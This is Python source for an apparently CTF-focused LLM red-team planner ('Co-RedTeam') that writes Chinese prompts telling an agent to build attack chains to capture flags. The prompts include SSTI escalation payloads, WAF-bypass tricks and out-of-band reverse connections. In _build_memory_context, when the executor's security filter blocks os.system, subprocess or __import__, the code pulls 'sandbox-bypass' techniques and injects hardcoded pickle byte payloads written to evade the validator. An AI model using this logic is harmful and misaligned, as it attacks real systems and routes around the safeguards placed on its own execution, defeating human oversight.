# 仅保留核心三要素：端点、已知参数变量、沙箱边界规约。
# 其余叙述性散文、冗余说明在移交给 Planner 前物理剔除。
# ═══════════════════════════════════════════════════════════════════

_USER_GOAL_SOFT_LIMIT = 2500


def _extract_user_goal_dense(confirmed: dict[str, Any], adapter: ChallengeAdapter | None = None) -> str:
    """Build a high-density, minimal User Goal block from confirmed_vuln data.

    Only extracts: base_url, endpoints (top 20), CWE IDs + titles,
    and a minimal evidence summary (first 400 chars per vuln).
    Discards all narrative prose, verbose descriptions, and redundant rule text.
    """
    vulns = confirmed.get("vulnerabilities", [])
    target_context = confirmed.get("target_context", {})
    target_base = target_context.get("base_url", os.getenv("CO_REDTEAM_TARGET_BASE", ""))
    target_name = target_context.get("app_name", "目标应用")
    is_https = target_base.startswith("https://")

    prefixes = _discover_blueprint_prefixes(confirmed)
    endpoints = _extract_endpoints_from_vulns(vulns, prefixes)
    endpoints.sort()

    parts: list[str] = []
    parts.append(f"你是 Co-RedTeam 规划智能体。设计能拿到 flag 的完整攻击链。")
    parts.append(f"目标: {target_base} ({target_name}) — {'HTTPS' if is_https else 'HTTP'}")

    # ── 端点密炼（最多 20 条）──
    if endpoints:
        ep_lines = [f"  {ep}" for ep in endpoints[:20]]
        if len(endpoints) > 20:
            ep_lines.append(f"  ... (+{len(endpoints) - 20} more)")
        parts.append(f"端点 ({len(endpoints)} 条):\n" + "\n".join(ep_lines))

    # ── 漏洞密炼（CWE + title + 最小证据）──
    vuln_lines: list[str] = []
    for v in vulns:
        vid = v.get("id", "?")
        cwe = v.get("cwe_id", "?")
        title = v.get("title", "?")
        severity = v.get("severity", "?")
        source = v.get("source", "")
        sink = v.get("sink", "")

        # Extract minimal evidence: first 300 chars of code snippet
        evidence = v.get("evidence", "")
        if isinstance(evidence, dict):
            code = evidence.get("code_snippet", "")[:300]
        else:
            code = str(evidence)[:300]
        code_compact = code.replace("\n", "\\n").replace("\t", " ")

        vline = f"[{severity}] {cwe} {title} | {source}→{sink}"
        if code_compact.strip():
            vline += f" | 证据: {code_compact}"
        vuln_lines.append(vline)
    parts.append("漏洞:\n" + "\n".join(vuln_lines))

    # ── Blueprint 前缀 ──
    if prefixes:
        bp_str = "; ".join(f"{name}→{pref}" for name, pref in sorted(prefixes.items()))
        parts.append(f"蓝图前缀: {bp_str}")

    # ── 挑战适配器规则 ──
    challenge_rules = ""
    if adapter is not None:
        challenge_rules = adapter.extra_rules()

    # ── JSON 输出格式要求（极简）──
    parts.append("""【JSON输出格式 — 声明式 AST 强校验】
顶层: version(1), plan_id, vuln_summary, rationale, chain_design, steps(list), history_state, primitive_context
每step必须声明: id(int), status("PLANNED"), type("python"|"shell"), purpose, expected_outcome, depends_on, on_failure("BLOCK_AND_DEBUG"|"SKIP"), why_this_step_advances_state, why_this_payload_is_a_mutation, why_this_is_not_regression, target_primitive, why_this_primitive_advances_chain
每step必须声明结构化数组（Validator 静态期校验，不通过则 valid:false 拒绝）：
  imports: [str] — 此步骤所使用的所有 Python import 模块（如 ["json","re","redteam_sdk"]），严禁包含 safe_modules 之外的模块！
  sdk_calls: [str] — 此步骤调用的 SDK 原语（如 ["HttpClient.get","HttpClient.post"]），必须来自 Manifest sdk_primitives，严禁空数组绕过！
【协议统一强制规则 — AST 纯模式】：
  当 sdk_calls 非空时，系统进入 AST 纯模式。在此模式下：
  ❌ 禁止输出 command 字段（包括占位符如 "command": "placeholder"、"command": ""）
  ❌ 禁止同时输出 command + sdk_calls（混合模式导致协议冲突，Validator 直接拒绝）
  ✅ 输出格式必须为纯 AST：{"imports": [...], "sdk_calls": [...]}
  ✅ 如果必须使用原始 Python 代码（非标准 SDK 调用），则使用 command 字段 + 不声明 sdk_calls
  ⚠️ sdk_calls 与 command 互斥！选择其一出，另一省略。
primitive_context: {current_primitive, target_primitive, transition_edge, fallback_primitive}
history_state: {tried_payloads:[], failed_reasons:[], consecutive_failures_per_category:{}, forced_path_switch:""}""")

    core = "\n\n".join(parts)

    # ── 追加 CWE 模板和公共规则（但限制体积）──
    cwe_templates = _build_cwe_templates(vulns, confirmed)
    if cwe_templates:
        core += f"\n\n【CWE模板】\n{_physical_truncate(cwe_templates, 600)}"

    core += f"\n\n{_COMMON_RULES[:800]}"
    if challenge_rules:
        core += f"\n{challenge_rules[:500]}"

    return core


def build_dynamic_prompt(confirmed: dict[str, Any], adapter: ChallengeAdapter | None = None) -> str:
    vulns = confirmed.get("vulnerabilities", [])
    if not vulns:
        return "你是 Co-RedTeam 规划智能体。\n" + _COMMON_RULES

    target_context = confirmed.get("target_context", {})
    target_base = target_context.get("base_url", os.getenv("CO_REDTEAM_TARGET_BASE", ""))

    if not target_base:
        return (
            "【严重配置错误】目标基础 URL 为空！\n"
            "请在 confirmed_vuln.json 的 target_context.base_url 字段指定目标地址，"
            "或设置环境变量 CO_REDTEAM_TARGET_BASE。\n"
            "例如：设置环境变量 CO_REDTEAM_TARGET_BASE=https://真实IP:端口 或在 CLI 使用 --url 参数\n"
            "无法生成攻击计划，请先修复配置后再运行。"
        )

    target_name = target_context.get("app_name", "目标应用")
    
    is_https = target_base.startswith("https://")
    protocol_hint = f"\n【协议检测】：目标使用 {'HTTPS (SSL/TLS)' if is_https else 'HTTP (明文)'}，所有请求必须使用 {'https://' + ('加 verify=False 参数' if is_https else '') if is_https else 'http://' + ('不需要 verify=False' if not is_https else '')}"

    prefixes = _discover_blueprint_prefixes(confirmed)
    endpoints = _extract_endpoints_from_vulns(vulns, prefixes)

    discovered_routes = target_context.get("discovered_routes", [])
    if discovered_routes:
        route_re = re.compile(r"""@(\w+)\.route\('([^']*)'\)""")
        for raw in discovered_routes:
            m = route_re.search(raw)
            if m:
                bp_name, ep = m.group(1), m.group(2)
                prefix = prefixes.get(bp_name, "")
                full = prefix + ep if prefix else ep
                if full not in endpoints:
                    endpoints.append(full)

    endpoints.sort()

    vuln_table = _build_vuln_table(vulns)
    evidence_extracts = _build_evidence_extracts(vulns)
    cwe_templates = _build_cwe_templates(vulns, confirmed)
    os_context = _get_os_context()

    bp_info = ""
    if prefixes:
        bp_lines = [f"  {name} -> 前缀 {prefix}" for name, prefix in sorted(prefixes.items())]
        bp_info = "\n【已发现的 Blueprint 前缀映射】：\n" + "\n".join(bp_lines) + "\n  所有端点都已自动加上对应前缀，请直接使用完整URL。\n"

    if not endpoints:
        endpoints_str = "  （从evidence/attack_chain中提取；如果没有则根据代码片段合理推断）"
    else:
        endpoints_str = "\n".join(f"  {ep}" for ep in endpoints)

    if endpoints:
        endpoints_str += "\n\n【URL构造规则】：以上端点已经包含完整的 Blueprint 前缀（如 /challenge/api/register）。获取完整URL时直接拼接: {base_url}{endpoint}。"

    challenge_rules = ""
    if adapter is not None:
        challenge_rules = adapter.extra_rules()

    # ── 核心攻击逻辑（前置，让 LLM 第一眼看到最关键的信息）──────
    core_logic = f"""你是 Co-RedTeam 规划智能体。设计能拿到 flag 的完整攻击链。

目标: {target_base} ({target_name}) — {protocol_hint}
蓝图层: {bp_info if bp_info else '无'}
端点: {endpoints_str}

═══════════════ ★ 漏洞核心证据与攻击链（← 从这里开始！） ═══════════════
你必须基于以下 Stage 1 审计结果制定计划。如果漏洞有 CVE 编号，严格按对应 PoC 逻辑编写 exploit 代码。
{evidence_extracts}

══════════════ 漏洞概览 ═══════════════
{vuln_table}"""

# ── CWE 模板 + 规则放后面，作为参考而非主读材料 ──
    if cwe_templates:
        core_logic += f"\n\n【CWE 专项模板参考】\n{cwe_templates}"

    core_logic += f"""

【攻击链设计要求】
1. 根据漏洞依赖关系设计从入口到 flag 的完整路径
2. 第一步必须以探测/验证开头，最后一步必须尝试获取 flag
3. 步骤间数据通过 ContextStore/save_context/output_result 传递
4. 遇到 HAProxy/WAF 路径规则绕过，使用 raw_request() 原样发送 #/%00/..;/ 字符
5. Blind RCE 时立即切换 OOBReceiver 带外反连

【JSON 格式要求】
顶层字段: version(1), plan_id(str), vuln_summary(str), rationale(str), chain_design(str), steps(list), history_state(对象), primitive_context(对象)
每个 step: id(int), status("PLANNED"), type("python"|"shell"), command(str: 完整多行脚本), purpose(str), expected_outcome(str), depends_on(str|null), on_failure("BLOCK_AND_DEBUG"|"SKIP"), why_this_step_advances_state(str), why_this_payload_is_a_mutation(str), why_this_is_not_regression(str), target_primitive(str), why_this_primitive_advances_chain(str)
【exploit reasoning 字段 — 每个 step 必须填写以下字段，否则计划会被 Validator 拒绝】：
  - why_this_step_advances_state: 解释此步骤如何推动 exploit 状态从当前状态向前推进（不是维持现状）
  - why_this_payload_is_a_mutation: 解释此 payload 与历史 payload 的关系（基于什么历史 payload 做的变异、为什么选择这个变异方向）
  - why_this_is_not_regression: 证明此步骤不会导致状态退化或重复已证伪的路径
  - target_primitive: 此步骤的目标 exploit primitive（如 ssti_reflection / sql_union / command_execution）。不能为空！你必须从 Primitive Taxonomy 中选定一个。
  - why_this_primitive_advances_chain: 解释为什么此 primitive 会推进 exploit chain。必须引用具体的 primitive transition graph 边。
primitive_context: {{"current_primitive": "当前处于哪个primitive", "target_primitive": "本轮目标primitive", "transition_edge": "current->target transition条件", "fallback_primitive": "如果升级失败回退到哪个primitive"}}
history_state: {{"tried_payloads":[...], "failed_reasons":[...], "consecutive_failures_per_category":{{}}, "forced_path_switch":"...""}}

【防死循环】
- 禁止重复 tried_payloads 中的 payload
- 同类漏洞连败 ≥3 次强制切换攻击路径
- rationale 开头说明本轮与前轮的关键区别

	【🔴 VERBATIM COPY — 精确复制规则（最高优先级，违反则攻击必然失败）】
	当 CWE 模板或长期记忆中出现以下任一标记时，你必须逐字符原样复制代码，严禁做任何改写：
	  标记 1: "EXACT FORGE FUNCTION (verbatim copy — DO NOT MODIFY)"
	  标记 2: "CRITICAL RULES (violation = exploit fails)"
	  标记 3: "【绝对禁止】"

	严禁的改写行为（这些行为已导致多次任务失败）：
	  ❌ 禁止用 json.dumps(dict) 替代字符串拼接（JSON key 顺序对漏洞利用至关重要）
	  ❌ 禁止在 base64 编码后调用 .rstrip('=')（python_jwt 内部解码器需要完整 padding）
	  ❌ 禁止改变 polyglot 构造中的 key 顺序（必须把伪造 key 放在 JSON 对象的第一个位置）
	  ❌ 禁止用 requests.get() 替代 raw_request() 处理含 # 的路径（requests 库会丢弃 # 后的内容）
	  ❌ 禁止用 f-string 中的 {{header}}.{{payload}}.{{signature}} 替代模板中的固定拼接方式

	正确做法：见到 "verbatim copy" 标记 → 直接复制模板中的完整函数体 → 在 step.command 中调用它

【Step 状态机】
PLANNED→IN_PROGRESS→DONE(exit_code=0)|BLOCKED(exit_code≠0)→追加排错步骤

════════════════════ ★ 攻击状态机（Exploit State Machine）★ ════════════════
【状态推进路径】 init → probe_success → payload_injected → gadget_triggered → oob_received

你必须根据反馈中的 current_exploit_state 和 milestones_achieved 判断当前攻击阶段：
  - init: 还未证实任何攻击面可达 → 本轮以探测/验证端点/获取认证为主
  - probe_success: 已确认端点可达 → 本轮必须在探测 payload 注入点（SSTI/SQLi/命令注入尝试）
  - payload_injected: payload 已被目标接受 → 本轮必须触发 gadget 产生可观测效果
  - gadget_triggered: 漏洞已激活有 A 级证据 → 本轮必须升级到 S 级铁证（uid=0/flag/etc）
  - oob_received: 带外数据已到达 → 任务基本完成，收集 flag 并结束

【状态驱动的步骤规划】：
  你的每一步必须服务于状态推进。禁止在 probe_success 阶段反复重试相同探测，
  禁止在 payload_injected 阶段不尝试触发 gadget，禁止在 gadget_triggered 阶段不收集 flag。

════════════════ ★ 验证驱动攻击（Verification-Driven Exploit）★ ════════════════
【🔴 核心原则：每步攻击必须有验证反馈！严禁 Fire-and-Forget！】

你必须在每个关键攻击步骤后追加验证代码，通过 print() 输出验证结果：
  1. 注入 payload 后 → 必须立即 print HTTP 响应体（至少前 300 字符）
  2. 声称获得 RCE/命令执行后 → 必须紧接执行验证命令（id/whoami/ls）并 print 结果
  3. 声称获得文件读取后 → 必须 print 读取到的文件内容片段
  4. 声称触发 SSTI/SQLi 后 → 必须 print 注入结果与预期对比（如 print(f"SSTI result: {{resp.text[:200]}}")）
  5. 使用 OOBReceiver 后 → 必须 print OOB 回调内容（hit.body/hit.path）

【验证步骤模板（必须嵌入到每个攻击 step 的末尾）】：
  print("=" * 40)
  print(f"[VERIFY] step_purpose: {{verification_result}}")
  print(f"[VERIFY] expected: {{expected_behavior}}")
  print(f"[VERIFY] actual: {{actual_response_snippet}}")
  print(f"[VERIFY] status: PASS/FAIL")
  print("=" * 40)

【反 Fire-and-Forget 规则】：
  ❌ 禁止：注入 SSTI payload → 直接 STEP_OK 结束（没有验证是否返回 49）
  ❌ 禁止：执行 curl 命令 → 不检查 stdout 直接继续下一步
  ❌ 禁止：发送 SQL 注入 → 不检查响应中是否有数据库内容
  ✅ 必须：每步 print 关键输出 → 检查 → 根据结果决定下一步 → 再 print 下一步验证

════════════════ ★ 自适应 Payload 变异（Adaptive Payload Evolution）★ ════════════════
【Payload 演化规则 — 严禁随机生成！必须基于历史变异！】

  1. 从成功 payload 变异（沿结构梯度升级）:
     `{{{{ 7 * 7 }}}}` -> `{{{{ config }}}}` -> `{{{{ self.__init__.__globals__ }}}}` -> RCE chain
     保留已确认可达的模板结构，只升级内部执行原语

  2. 从失败 payload 变异（跨格式/编码尝试）:
     失败: `{{{{ 7 * 7 }}}}`
     变异方向: $`{{{{ 7 * 7 }}}}`、#`{{{{ 7 * 7 }}}}`、< % 7*7 % >、%7B%7B7*7%7D%7D
     保留语义，变换语法格式或编码方式

  3. 禁止破坏已确认的结构:
     - 如果双大括号结构已被确认可达，禁止替换为美元大括号结构（除非被 WAF 拦截）
     - 如果单引号OR结构被确认可注入，禁止替换为双引号OR（除非 SQL 报错指示引号不匹配）
     - 每次变异只改变一个维度（格式 / 编码 / 执行原语），不可同时全部改变

  【Payload 变异证明】:
  每个 step 的 why_this_payload_is_a_mutation 字段必须说明：
    - 基于哪个历史 payload 做的变异（引用具体 payload 内容）
    - 保留了什么结构
    - 改变了什么维度
    - 为什么选择这个变异方向

{_COMMON_RULES}
{challenge_rules}
"""

    prompt = core_logic

    return prompt


# ── CWE/类型自动推断（Phase 1 输出 type/cwe_id 通常为 UNKNOWN）──

_CWE_INFERENCE_TABLE: list[tuple[tuple[str, ...], str, str]] = [
    # (keywords, inferred_type, inferred_cwe)
    # 排前面优先级最高，精确匹配先于模糊匹配
    (("crlf", "memcached", "\\r\\n", "%0d%0a"), "crlf_injection", "CWE-93"),
    (("pickle", "deserializ", "unserializ", "__reduce__"), "deserialization", "CWE-502"),
    (("xss", "cross-site scripting", "cross-site-scripting", "stored xss", "reflected xss"), "xss", "CWE-79"),
    (("sqli", "sql injection", "union select", "boolean-based"), "sqli", "CWE-89"),
    (("path traversal", "directory traversal", "../", "..\\", "lfi"), "path_traversal", "CWE-22"),
    (("ssrf", "server-side request forgery"), "ssrf", "CWE-918"),
    (("xxe", "xml external entity"), "xxe", "CWE-611"),
    (("jwt", "jwt alg:none", "jku", "jwk injection"), "jwt_attack", "CWE-347"),
    (("ssti", "jinja2", "freemarker", "thymeleaf", "template injection"), "ssti", "CWE-1336"),
    (("command injection", "os.system", "shell_exec", "exec(", "cmd injection"), "command_injection", "CWE-78"),
]


def _infer_vuln_classification(vuln: dict[str, Any]) -> str:
    """从 title/source/sink/description 自动推断 CWE 和漏洞类型。

    返回格式: "CWE-502 deserialization"，含 type 和 cwe 两个字段供后续判断复用。
    按关键词命中数选最高分规则；title 字段权重翻倍（标题比描述更准确）。
    """
    text = " ".join(
        str(vuln.get(f, "")) for f in ("source", "sink", "description")
    ).lower()
    title_text = str(vuln.get("title", "")).lower()

    best_score = 0
    best_result = ""
    for keywords, vtype, cwe in _CWE_INFERENCE_TABLE:
        score = 0
        for kw in keywords:
            if kw in title_text:
                score += 2
            elif kw in text:
                score += 1
        if score > best_score:
            best_score = score
            best_result = f"{cwe} {vtype}"
    return best_result


def _build_memory_context(
    memory: LayeredMemory,
    confirmed: dict[str, Any],
    feedback: dict[str, Any] | None = None,
) -> str:
    """RAG 检索 + 元数据过滤：从 L1(模式) / L2(策略) / L3(技术) 提取相关经验。

    核心改进（v2）：
    1. 先从 confirmed_vuln.json 提取 target_tags（JWT / haproxy / python 等）
    2. 三层检索全部加 where 过滤，只召回 tags_str 匹配的条目
    3. 过滤无结果时自动降级为无过滤检索（由 memory_store 内部实现）
    4. 彻底解决"打 LockTalk 搜出致远 OA 脚本"的问题
    """
    vulns = confirmed.get("vulnerabilities", [])
    cwe_ids: list[str] = [
        v.get("cwe_id", "") for v in vulns if v.get("cwe_id")
    ]
    vuln_titles = " ".join(v.get("title", "") for v in vulns)[:300]
    vuln_desc = " ".join(
        f"{v.get('source', '')} {v.get('sink', '')} {v.get('description', '')}"
        for v in vulns
    )[:500]

    # ── 提取技术栈标签用于 ChromaDB 元数据过滤 ──
    target_tags = _extract_target_tags(confirmed)

    # ── 从 feedback 提取错误指纹用于精准避坑检索 ──
    error_hints = ""
    if feedback:
        errors = feedback.get("errors", []) if isinstance(feedback.get("errors"), list) else []
        stderr_snippets = " ".join(str(e) for e in errors)[:200]
        fb_text = feedback.get("feedback_for_planner", "")[:300]
        fb_summary = feedback.get("summary", "")[:200]
        error_hints = f"{stderr_snippets} {fb_text} {fb_summary}"

    context_parts: list[str] = []

    # ═══════════════════════════════════════════════════════════════
    # L1 — 漏洞模式（pattern_collection）[元数据过滤]
    # ═══════════════════════════════════════════════════════════════
    pattern_query = f"{' '.join(cwe_ids)} {vuln_titles} 漏洞模式 检测路径"
    pattern_results = memory.query_patterns_filtered(
        pattern_query, filter_tags=target_tags, n_results=3,
    )
    if pattern_results:
        context_parts.append("  【L1·漏洞模式】")
        for i, item in enumerate(pattern_results):
            context_parts.append(f"    ▸ {item.get('content', '')[:300]}")

    # ═══════════════════════════════════════════════════════════════
    # L2 — 利用策略（strategy_collection），成功 + 失败分列 [元数据过滤]
    # ═══════════════════════════════════════════════════════════════
    success_hits: list[str] = []
    failure_hits: list[str] = []

    # CWE-keyed 成功策略
    for cwe in cwe_ids[:3]:
        results = memory.query_strategies_filtered(
            query_text=f"{cwe} {vuln_titles[:100]} 利用 攻击 payload 绕过",
            filter_tags=target_tags,
            n_results=3,
        )
        for item in results:
            stype = item.get("metadata", {}).get("strategy_type", "")
            if stype != "failure":
                content = item.get("content", "")[:250]
                if content not in success_hits:
                    success_hits.append(content)

    # 通用成功策略兜底
    if len(success_hits) < 3:
        results = memory.query_strategies_filtered(
            query_text=f"{vuln_desc[:200]} 漏洞利用 成功 攻击步骤",
            filter_tags=target_tags,
            n_results=5,
        )
        for item in results:
            stype = item.get("metadata", {}).get("strategy_type", "")
            if stype != "failure":
                content = item.get("content", "")[:250]
                if content not in success_hits:
                    success_hits.append(content)

    # 失败教训：CWE-keyed + error-keyed
    for cwe in cwe_ids[:3]:
        results = memory.query_strategies_filtered(
            query_text=f"{cwe} 失败 错误 教训 避坑 不要",
            filter_tags=target_tags,
            n_results=3,
        )
        for item in results:
            if item.get("metadata", {}).get("strategy_type") == "failure":
                content = item.get("content", "")[:250]
                if content not in failure_hits:
                    failure_hits.append(content)

    if error_hints.strip():
        results = memory.query_strategies_filtered(
            query_text=f"{error_hints[:300]} 失败 错误 修复",
            filter_tags=target_tags,
            n_results=3,
        )
        for item in results:
            if item.get("metadata", {}).get("strategy_type") == "failure":
                content = item.get("content", "")[:250]
                if content not in failure_hits:
                    failure_hits.append(content)

    if success_hits:
        context_parts.append("  【L2·成功策略】")
        for i, s in enumerate(success_hits[:5]):
            context_parts.append(f"    ✅ {s}")
    if failure_hits:
        context_parts.append("  【L2·失败教训（禁止重复！）】")
        for i, fh in enumerate(failure_hits[:5]):
            context_parts.append(f"    ❌ {fh}")

    # ═══════════════════════════════════════════════════════════════
    # L3 — 技术操作（tech_collection）★ 最关键的一层 ★ [元数据过滤]
    # ═══════════════════════════════════════════════════════════════
    tech_items: list[dict[str, Any]] = []
    for cwe in cwe_ids[:3]:
        results = memory.query_tech_payloads_filtered(
            query_text=f"{cwe} payload 攻击 利用 命令 脚本",
            filter_tags=target_tags,
            n_results=4,
        )
        for item in results:
            if item.get("content", "") not in [t.get("content", "") for t in tech_items]:
                tech_items.append(item)

    # 🔑 Executor 运行时拦截感知检索：从 feedback/error_hints 提取 PYTHON_BLOCKED 模式关键词
    security_patterns_in_feedback: list[str] = []
    if error_hints.strip():
        import re as _re
        _blocked_matches = _re.findall(r'os_system_exec|dynamic_import|PYTHON_BLOCKED|SECURITY_BLOCKED|__import__|os\.system|os\.popen|subprocess\.run', error_hints)
        security_patterns_in_feedback = list(set(_blocked_matches))
    if security_patterns_in_feedback:
        sandbox_query = f"沙箱绕过 sandbox-bypass {' '.join(security_patterns_in_feedback)} 规避 白名单 payload"
        sandbox_results = memory.query_tech_payloads(
            query_text=sandbox_query,
            n_results=4,
        )
        for item in sandbox_results:
            if item.get("content", "") not in [t.get("content", "") for t in tech_items]:
                tech_items.append(item)
                # 提前标记为沙箱规避技术，在渲染时高亮提示
                item["_sandbox_bypass"] = True

    # 通用 payload 兜底
    if len(tech_items) < 4:
        results = memory.query_tech_payloads_filtered(
            query_text=f"{vuln_desc[:300]} {vuln_titles[:150]} payload 注入 攻击",
            filter_tags=target_tags,
            n_results=4,
        )
        for item in results:
            if item.get("content", "") not in [t.get("content", "") for t in tech_items]:
                tech_items.append(item)

    if tech_items:
        context_parts.append("  【L3·特种 Payload / 脚本（可直接复用！）】")
        payload_seen: set[str] = set()
        for i, item in enumerate(tech_items[:8]):
            payload = item.get("payload") or ""
            cmd = item.get("command") or ""
            script = item.get("script") or ""
            meta = item.get("metadata", {})
            name = meta.get("name", "") or meta.get("context", "") or ""
            source = meta.get("source", "")
            source_tag = f" [来源:{source}]" if source else ""
            is_sandbox = "⚠️ SANDOBOX-BYPASS" if item.get("_sandbox_bypass") else ""

            if payload and payload not in payload_seen:
                payload_seen.add(payload)
                context_parts.append(f"    📦 {is_sandbox} Payload({name}){source_tag}: {payload[:250]}")
            elif cmd and cmd not in payload_seen:
                payload_seen.add(cmd)
                context_parts.append(f"    💻 {is_sandbox} 命令{source_tag}: {cmd[:200]}")
            elif script and script not in payload_seen:
                payload_seen.add(script)
                context_parts.append(f"    📜 {is_sandbox} 脚本({name}):\n{script[:350]}")
            else:
                context_parts.append(f"    ▸ {item.get('content', '')[:200]}")

    # ═══════════════════════════════════════════════════════════════
    # 精确匹配强制注入 — 绕过 ChromaDB 语义检索的不确定性
    # ═══════════════════════════════════════════════════════════════
    #
    # Phase 1 静态分析生成的 confirmed_vuln.json 中 type/cwe_id 通常为 UNKNOWN，
    # 但 title/source/sink/description 已包含足够的分类信息。此处做一次自动推断。
    # ═══════════════════════════════════════════════════════════════
    forced_injection = ""
    pickle_block_injected = False

    # 从分类字段 + 自动推断合成 vuln_text
    classified_parts: list[str] = []
    for v in vulns:
        for f in ("type", "cwe_id", "cwe"):
            val = str(v.get(f, "")).strip()
            if val and val.upper() != "UNKNOWN":
                classified_parts.append(val)
        classified_parts.append(_infer_vuln_classification(v))
    vuln_text = " ".join(classified_parts).lower()

    pickle_triggers = ("pickle.", "pickle_", "__reduce__", "Pickler", "Unpickler", "dumps(", "loads(")
    # Only inject pickle-specific rules when real deserialization patterns appear
    # (bare word "pickle" as in "in a pickle" is a figure of speech, not a vuln)
    has_pickle = any(k in vuln_text for k in pickle_triggers)
    if not has_pickle:
        raw_vuln_text = " ".join(
            str(v.get(f, "")) for v in vulns for f in ("title", "source", "sink", "description")
        ).lower()
        has_pickle = any(k in raw_vuln_text for k in pickle_triggers)
    if has_pickle:
        tech_json_path = memory.memory_dir / "memory" / "tech.json"
        if tech_json_path.exists():
            try:
                with open(tech_json_path, encoding="utf-8") as _f:
                    tech_data = json.load(_f)
                payloads = tech_data.get("payload_templates") or []
                matched: list[str] = []
                for pt in payloads:
                    tags = [t.lower() for t in (pt.get("tags") or [])]
                    if any("pickle" in t or "sandbox-bypass" in t for t in tags):
                        tpl = pt.get("template") or pt.get("payload_template") or ""
                        name = pt.get("name", "")
                        if tpl and tpl not in matched:
                            matched.append(tpl)

                if matched:
                    blocks = []
                    blocks.append("═" * 72)
                    blocks.append("🔴 强制注入：pickle 沙箱安全手法（必须遵守！）")
                    blocks.append("═" * 72)
                    blocks.append("❌ 绝对禁止在代码中写 import pickle / import os / import subprocess")
                    blocks.append("❌ 绝对禁止代码文本出现 os.system( / os.popen( / subprocess.run( / __import__(")
                    blocks.append("✅ 必须使用以下经过验证的 bytes 硬编码手法，直接复制使用：")
                    blocks.append("")
                    for i, tpl in enumerate(matched):
                        blocks.append(f"─── 手法 {i+1} ───")
                        blocks.append(tpl.strip())
                        blocks.append("")
                    blocks.append("═" * 72)
                    forced_injection = "\n".join(blocks)
                    pickle_block_injected = True
            except Exception:
                pass

    if pickle_block_injected:
        print("[planner] 🔴 pickle 精确匹配手法已强制注入 prompt 开头")

    # ── 组装最终记忆块 ──
    body = "\n".join(context_parts) if context_parts else ""
    # 硬截断：memory_block 是增量注入到 system prompt 的，不是核心攻击逻辑，
    # 一旦超过 5000 字符就说明 tag-filter 大面积 fallback 导致噪音涌入，必须物理截断。
    _MAX_MEM_BODY = 5000
    if len(body) > _MAX_MEM_BODY:
        body = body[:_MAX_MEM_BODY // 3] + f"\n...[TRUNCATED memory body {len(body)} → {_MAX_MEM_BODY} chars]...\n" + body[-_MAX_MEM_BODY * 2 // 3:]
        print(f"[planner] ⚠️ memory_body 超限 ({len(body)} > {_MAX_MEM_BODY})，已硬截断")

    filter_note = ""
    if target_tags:
        filter_note = f"\n🔍 元数据过滤已启用 | target_tags: {', '.join(target_tags[:10])}"

    memory_block = f"""╔══════════════════════════════════════════════════════════════╗
║  🧠 长期记忆提取 — 强制参考（L1/L2/L3 ChromaDB 向量检索）  ║
╚══════════════════════════════════════════════════════════════╝
【⚠️ 你必须将以下经验整合进攻击计划中，不得无视！】{filter_note}

{body}

────────────────────────────────────────────────────────────
【使用说明】：
- L3 中的 Payload 和脚本已从历史经验库中向量匹配，与当前目标高度相关
- 如果 L3 提供了完整的 Python/Shell payload，直接将其核心逻辑嵌入 type="python" 或 type="shell" 步骤
- L2 中的失败教训是本系统积累的"避坑指南"，绝对禁止重蹈覆辙
- 如果某个 Payload 和当前目标的端点/参数/攻击面不匹配，应改编而非完全抛弃
────────────────────────────────────────────────────────────"""

    if forced_injection:
        return forced_injection + "\n\n" + memory_block
    if not context_parts:
        return ""
    return memory_block


def _mock_plan(confirmed: dict[str, Any], memory: LayeredMemory) -> dict[str, Any]:
    vid = confirmed.get("vuln_id", "unknown")
    title = confirmed.get("title", "未命名漏洞")
    plan_id = f"mock-{vid}-1"

    os_info = platform.system()
    steps = [
        {
            "id": 1,
            "type": "shell",
            "command": f"echo Environment check on {os_info}",
            "purpose": f"环境自检({os_info})",
        },
        {
            "id": 2,
            "type": "shell",
            "command": f"echo Target: {title}",
            "purpose": "对齐漏洞上下文",
        },
    ]

    mem_stats = memory.get_stats()
    mem_context = _build_memory_context(memory, confirmed)
    steps.append(
        {
            "id": 3,
            "type": "python",
            "command": f'python -c "print(\'[mock] layered memory stats: {mem_stats}\')"',
            "purpose": "展示已加载长期记忆规模（演示）",
        }
    )

    return {
        "version": 1,
        "plan_id": plan_id,
        "vuln_summary": title,
        "rationale": "MOCK：未调用大模型。配置 DEEPSEEK_API_KEY 并关闭 CO_REDTEAM_MOCK_LLM 以生成真实计划。",
        "steps": steps,
        "raw_memory_chars": len(mem_context),
        "memory_stats": mem_stats,
        "platform": os_info,
    }


def _build_forbidden_techniques_block(feedback: dict[str, Any]) -> str:
    """从上一轮 feedback 中提取"绝对禁止重用"的技术列表。

    来源 1：Evaluator 的 memory_patch.strategy.add_failures（历史证伪的技术）
    来源 2：Validator 的 rejection errors（本轮的 AST/策略拒绝记录）
    返回一个高可见度的禁止块，直接拼入 system prompt。
    """
    memory_patch = feedback.get("memory_patch", {})
    strategy_patch = memory_patch.get("strategy", {})
    failures = list(strategy_patch.get("add_failures", []))

    # 来源 2：Validator 拒绝记录 → 转化为禁止项
    validator_errors = feedback.get("errors", []) if feedback.get("from") == "validator" else []
    for err_text in validator_errors:
        err_str = str(err_text)
        # 提取被拒绝的模式名（从 remediation 文本中解析）
        if "os.system" in err_str or "禁止代码文本出现 os.system(" in err_str:
            failures.append({"step_id": "?", "error": "validator_rejected_os_system", "root_cause": err_str[:200]})
        elif "subprocess" in err_str:
            failures.append({"step_id": "?", "error": "validator_rejected_subprocess", "root_cause": err_str[:200]})
        elif "__import__" in err_str:
            failures.append({"step_id": "?", "error": "validator_rejected_dynamic_import", "root_cause": err_str[:200]})
        else:
            failures.append({"step_id": "?", "error": "validator_rejected", "root_cause": err_str[:200]})

    if not failures:
        return ""

    lines: list[str] = []
    lines.append("╔══════════════════════════════════════════════════════════════╗")
    lines.append("║  🔴 失败指纹黑名单 — 绝对禁止重用以下已证伪的技术！      ║")
    lines.append("╚══════════════════════════════════════════════════════════════╝")
    lines.append("")
    lines.append("以下技术在上轮执行中已被证伪。你在本轮【绝对禁止】以任何形式复现：")
    lines.append("")

    for i, f in enumerate(failures, 1):
        step_id = f.get("step_id", "?")
        error = f.get("error", "未知错误")
        root_cause = f.get("root_cause", "")
        lines.append(f"  🚫 禁止项 #{i}（上轮 step {step_id} — {error}）")
        if root_cause:
            lines.append(f"     根因: {root_cause}")
        payload_text = f.get("payload", "")
        if payload_text:
            lines.append(f"     已证伪载荷: {payload_text[:200]}")

    lines.append("")
    lines.append("【强制反省要求】：")
    lines.append("  1. 在 rationale 中逐项列出上述禁止项，并说明本轮如何避免")
    lines.append("  2. 如果你在本轮生成了包含上述载荷的 step，你的计划将被直接拒绝")
